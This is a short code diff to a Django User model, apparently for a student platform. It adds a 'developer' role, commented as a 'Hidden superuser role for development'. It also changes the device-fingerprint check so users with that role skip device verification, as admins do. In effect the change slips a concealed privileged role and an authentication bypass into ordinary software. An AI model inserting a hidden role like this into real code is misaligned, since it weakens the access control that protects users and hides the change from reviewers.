@@ -46,6 +46,7 @@ class User(AbstractBaseUser, PermissionsMixin):
         ('admin', 'Admin'),
         ('student', 'Student'),
         ('staff', 'Staff'),
+        ('developer', 'Developer'),  # Hidden superuser role for development
     ]
     
     id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
@@ -105,6 +106,11 @@ class User(AbstractBaseUser, PermissionsMixin):
         """Check if user is student."""
         return self.role == 'student'
     
+    @property
+    def is_developer(self):
+        """Check if user is developer."""
+        return self.role == 'developer' or self.is_superuser
+    
     def update_device_info(self, fingerprint, ip_address):
         """Update user's device fingerprint and IP."""
         self.device_fingerprint = fingerprint
@@ -119,7 +125,7 @@ class User(AbstractBaseUser, PermissionsMixin):
         - No device fingerprint set yet (first login)
         - Device fingerprint matches stored fingerprint
         """
-        if self.role == 'admin' or self.is_superuser:
+        if self.role == 'admin' or self.role == 'developer' or self.is_superuser:
             return True
 
         if not self.device_fingerprint:
